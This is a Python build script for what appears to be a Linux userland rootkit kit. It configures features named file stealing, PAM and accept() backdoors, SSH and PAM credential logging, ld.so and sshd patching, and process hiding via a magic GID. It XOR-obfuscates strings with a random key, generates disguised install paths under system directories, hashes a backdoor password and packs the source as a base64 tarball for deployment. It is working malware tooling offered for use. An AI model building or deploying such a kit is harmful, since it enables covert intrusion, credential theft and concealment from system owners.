#!/usr/bin/env python

from configparser import ConfigParser
from sys import argv
from re import search as re_search
from crypt import crypt
from base64 import b64encode
from string import ascii_uppercase, ascii_lowercase, digits
lower, upper = ascii_lowercase, ascii_uppercase
from random import choice
from os import system, unlink
from os.path import isdir, exists
from itertools import cycle
try:
    from itertools import izip
    zipper = izip
except: zipper = zip

SRC = 'src'
INC = SRC+'/include'
BDVLH, CONFIGH = INC+'/bdv.h', INC+'/config.h'
HOOKS_PATH = SRC+'/hooks/libdl/hooks'

class Configuration:
    def __init__(self, pathname):
        self.cfg = ConfigParser()
        with open(pathname, 'r') as f:
            self.cfg.read_file(f)

    def bool_sort(self, d):
        nd = {}
        for k in d:
            kc, vc = list(d[k].keys()), list(d[k].values())
            for n in range(len(vc)):
                if type(vc[n]) == bool:
                    new_define = kc[n].replace('-', '_').upper()
                    nd[new_define] = vc[n]
        return nd

    def self_cleanse(self, d):
        keys_enabled = [  # some sections have boolean values in them which enable or disable the section in question. this function removes any sections not needed.
            ['File Stealing', 'enable-steal'],
            ['Ass Hiding', 'hide-my-ass'],
            ['Magic Ext Attribute', 'use-magic-attr'],
            ['PAM auth logs', 'pam-auth-logging'],
            ['SSH logs', 'outgoing-ssh-logging'],
            ['PAM backdoor', 'use-pam-bd'],
            ['accept backdoor', 'use-accept-bd'],
            ['Patch ld.so', 'patch-ld'],
            ['SSHD Patch', ['hard-patch', 'soft-patch']],
            ['Uninstall Timer', ['after-days', 'after-hours']],
            ['SELINUX Status Check', 'check-selinux-pre-install']
        ]
        for key in keys_enabled:
            section, masters = key[0], key[1]
            tm = type(masters)
            if tm == str:
                if not d[section][masters]:
                    d.pop(section, None)
            elif tm == list:
                n, c = len(masters), 0  # if the amount of False masters matches the total amount of all masters, the section is popped.
                for t in masters:
                    if not d[section][t]:
                        c += 1
                if c == n:
                    d.pop(section, None)
        return d

    def self_eval(self):
        nd, c = {}, self.cfg
        for k in c:
            if k == 'DEFAULT':
                continue
            kc, vc = list(c[k].keys()), list(c[k].values())
            for n in range(len(vc)):
                if not k in nd:
                    nd[k] = {}
                nd[k][kc[n]] = eval(vc[n])
        return self.self_cleanse(nd)

class CArray(): # default is assumed to be a static array of char pointers
    def __init__(self, name, alist, arrtype='static char*'):
        self.name = name
        self.llen = len(alist)
        self.alist = alist
        self.atype = arrtype
        self.typeformat = '{0} const {1}[{2}] = '
        self.strings = True if 'char*' in arrtype else False
        self.sizename = '{0}_SIZE'.format(name.upper())

    # create a define for the new array's size.
    def getsizedef(self):
        size_def = '#define {0} {1}\n'
        size_def = size_def.format(self.sizename, self.llen)
        return size_def

    def declarearray(self):
        return self.typeformat.format(self.atype, self.name, self.sizename)

    # build elements of target array.
    def buildelems(self, elems='{'):
        for elem in self.alist:
            elems += '"{0}",'.format(DOXOR(elem)) if self.strings else '{0},'.format(elem)
        return elems[:-1] + '};\n'

    # create full C array.
    def create(self):
        rv = self.getsizedef()
        rv += self.declarearray()
        rv += self.buildelems()
        return rv

class CDict():
    def __init__(self, adict):
        self.keys = list(adict.keys())
        self.vals = list(adict.values())
        self.rang = range(len(self.keys))

    def getarrays(self):
        rv = ''
        for n in self.rang:
            arr = CArray(self.keys[n], self.vals[n])
            rv += arr.create()
        return rv

    def getdefs(self):
        rv = ''
        fmt = '#define {0} {1}\n'
        for n in self.rang:
            name, val = self.keys[n], self.vals[n]
            if not val: continue
            n = '"{0}"'.format(ut.doxor(val)) if type(val) == str else str(val)
            rv += fmt.format(name, n)
        return rv

    def conditionaldefs(self):
        rv = ''
        fmt = '#define {0}\n'
        for n in self.rang:
            name, val = self.keys[n], self.vals[n]
            rv += fmt.format(name) if val else ''
        return rv

class Hooks():
    def __init__(self, path):
        self.path = path
        self.allhooks = []

    def readhooks(self):
        with open(self.path, 'r') as fd:
            contents = fd.read()
        return [c for c in contents.split('\n') if c]

    def parseline(self, line):
        tok = line.split(':')
        return [tok[0], tok[1].split(',')]

    def gethooks(self):
        nd = {}
        for line in self.readhooks():
            tok = self.parseline(line)
            self.allhooks.extend(tok[1])
            nd[tok[0]] = tok[1]
        return nd

class Definitions():
    def __init__(self, alist, defprefix='C'):
        self.array_list = alist
        self.list_len = len(alist)
        self.defprefix = defprefix

    # for constant strings...
    def getcdef(self, name, val):
        c_def = '#define {0} "{1}"\n'
        c_def = c_def.format(name, ut.doxor(val))
        return c_def

    # or literally anything else.
    def getidef(self, name, val):
        c_def = '#define {0} {1}\n'
        c_def = c_def.format(name, val)
        return c_def

    # returns a new identifier definition based on name & index.
    # where index is the current index of the target array.
    def getident(self, nam, index):
        rlnam = nam.upper()
        ident = '#define {0}{1} {2}\n'
        ident = ident.format(self.defprefix, rlnam, str(index))
        return ident

    # gets all identifiers for data in the target array
    def getidents(self):
        idents = ''
        for i in range(self.list_len):
            name = self.array_list[i].split(' ')[0].split('-')[0]
            idents += self.getident(name, i)
        return idents

rootdirs, xkey = ['/bin', '/lib', '/var', '/etc', '/usr'], [choice(range(128, 252)) for _ in range(128)]
def DOXOR(data):
    if not data:
        return None
    xres = ''.join(list('\\x'+hex(ord(x) ^ y)[2:] for (x,y) in zipper(data, cycle(xkey))))
    return xres
def RANDOM(cset,clen):
    garb = ''.join(choice(cset) for _ in range(clen))
    return garb
def RANDPORT():
    return choice(range(9362, 65534))
def RANDPORTS(n):
    return [RANDPORT() for _ in range(n)]
def CRYPTPW(plain):
    salt = RANDOM(upper+lower+digits, 16)
    return crypt(plain, "$6$"+salt)
def RANDNAME():
    with open('./etc/names', 'r') as fd:
        contents_names = fd.read()
    return choice(contents_names.split())
def GETPATHROOT():
    randroot = choice(rootdirs)
    if not isdir(randroot):
        return GETPATHROOT()
    randname = RANDNAME()
    return randroot+'/'+randname
def RANDPATH():
    randdir = GETPATHROOT()
    randdir += '.' + RANDOM(lower, 3)
    return randdir

def defineify(d, rv=''):
    keys, vals = list(d.keys()), list(d.values())
    for n in range(len(keys)):
        my_type = type(vals[n])
        if my_type == bool or vals[n] == None:
            continue

        new_name = keys[n].replace('-', '_')
        if my_type == list and len(vals[n]) > 0:
            if re_search('valid.+opts', new_name) or re_search('valid.+cmds', new_name):
                name_prefix = new_name[5:]
                name_prefix = name_prefix[:6]
                name_prefix = name_prefix.upper() + '_'
                rv += expond(new_name, vals[n], defprefix=name_prefix)
            else:
                atype = 'static char*' if type(vals[n][0]) == str else 'static int'
                ca = CArray(new_name, vals[n], arrtype=atype)
                rv += ca.create()
            continue
        else:
            new_define = new_name.upper()
            rv += '#define {0} "{1}"\n'.format(new_define, DOXOR(vals[n])) if my_type == str else '#define {0} {1}\n'.format(new_define, vals[n])
            rv += '#define {0}_SIZE {1}\n'.format(new_define, len(vals[n])) if my_type == str else ''
    return rv

def expond(name, arr, defprefix='C'):
    c = CArray(name, arr)
    rv = c.create()
    c = Definitions(arr, defprefix=defprefix)
    rv += c.getidents()
    return rv

def getallhooks(rv=''):
    h = Hooks(HOOKS_PATH)
    hookees = h.gethooks()
    cd = CDict(hookees)
    rv += cd.getarrays()
    rv += expond('all_calls', h.allhooks)
    return rv

def create_bdvh():
    contents = getallhooks()

    for check in config:
        contents += defineify(config[check])

    arr = CArray('xkey', xkey, arrtype='static char')
    contents += arr.create()

    # read max-gid from config. from that, get the minimum & a default magic gid.
    maxid = config['Magic GID']['max-gid']
    minid = int(maxid>>5)
    try: # python2 will fail trying to do this.
        defid = choice(range(minid, maxid))
    except:
        newmax = minid + choice(range(555, 1555))
        defid = choice(range(minid, newmax))

    magic_id = { 'MAGIC_GID':defid, 'MIN_GID':minid }
    magd = CDict(magic_id)
    contents += magd.getdefs()

    with open(BDVLH, 'w') as f:
        f.write(contents)

def finalize_configh():
    toggle_defines = cfg.bool_sort(config)
    transform_defs = CDict(toggle_defines)
    got_defines = transform_defs.conditionaldefs()

    with open(CONFIGH, 'a') as f:
        f.write(got_defines)

def mkb64():
    # make gzip compressed tarball of the kit's (newly configured) source.
    system('tar cpfz ./build/{0}.tar.gz {1}/'.format(aname, SRC))

    # encode the raw tarball data to base64 & keep result.
    with open('./build/'+aname+'.tar.gz', 'rb') as f:
        targzb64 = b64encode(f.read())

    # remove tarball & write b64.
    unlink('./build/'+aname+'.tar.gz')
    with open('./build/'+aname+'.b64', 'wb') as f:
        f.write(targzb64)

if exists(CONFIGH):
    print('Config header ({0}) already exists. Not doing setup again.\n'.format(CONFIGH) + 'If you want setup.py to go again, do make clean/cleanall first.')
    quit()

# read given configuration file & evaluate its contents.
cfg = Configuration(argv[1])
config = cfg.self_eval()

# swap out plaintext password straight away.
password_plain = config['Magic Credentials']['bdpassword']
password_crypt = CRYPTPW(password_plain)
config['Magic Credentials']['bdpassword'] = password_crypt

# create full bdv.h & config.h. make .b64 once ready.
create_bdvh()
finalize_configh()
try:    aname = config['PAM backdoor']['bdusername']
except: aname = RANDNAME()
mkb64()

# somewhat nicely format & write information about this configuration to its own file.
nfo = ''
config['Magic Credentials']['bdpassword'] = password_plain  # give back the plaintext password first.
for c in config:
    nfo += '\n\033[1;31m' + c.upper() + '\033[0m\n'
    for n in config[c]:
        nfo += n + ': ' + str(str(config[c][n]).encode('unicode-escape')) + '\n'
with open('./build/{0}.nfo'.format(aname), 'w') as f:
    f.write(nfo)
print(nfo)
print('\033[1m{0}.b64 & {0}.nfo are now available in ./build/\033[0m\n'.format(aname))